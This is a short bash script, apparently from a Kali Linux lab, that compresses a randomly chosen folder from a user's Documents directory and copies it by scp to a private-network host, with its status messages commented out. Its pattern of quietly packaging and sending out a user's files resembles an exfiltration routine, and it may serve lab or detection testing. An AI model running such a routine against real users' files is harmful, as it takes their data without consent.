#!/bin/bash

# Define the base directory
BASE_DIR="/home/kali/Documents"

# Remote server details
REMOTE_USER="kali"
REMOTE_HOST="192.168.0.222"
REMOTE_PATH="/home/kali/Downloads"

# Ensure the base directory exists
if [ ! -d "$BASE_DIR" ]; then
    echo "Base directory $BASE_DIR does not exist. Exiting."
    exit 1
fi

# Get a list of directories within BASE_DIR and choose one at random
DIR_LIST=("$BASE_DIR"/*/)
if [ ${#DIR_LIST[@]} -eq 0 ]; then
    echo "No directories found in $BASE_DIR. Exiting."
    exit 1
fi

RANDOM_DIR="${DIR_LIST[RANDOM % ${#DIR_LIST[@]}]}"
RANDOM_DIR_NAME=$(basename "$RANDOM_DIR")

# Define the backup file path
BACKUP_FILE="/tmp/${RANDOM_DIR_NAME}_backup.tar.gz"

# Compress the selected directory
#echo "Compressing files from $RANDOM_DIR into $BACKUP_FILE..."
tar -czf "$BACKUP_FILE" -C "$BASE_DIR" "$RANDOM_DIR_NAME"

# Transfer the compressed file to the remote server using sshpass
#echo "Transferring $BACKUP_FILE to $REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH..."
sudo -u kali scp "$BACKUP_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH"

# Completion message
#if [ $? -eq 0 ]; then
    #echo "Backup and transfer of $RANDOM_DIR completed successfully."
#else
    #echo "Backup or transfer failed."
#fi

echo $BACKUP_FILE
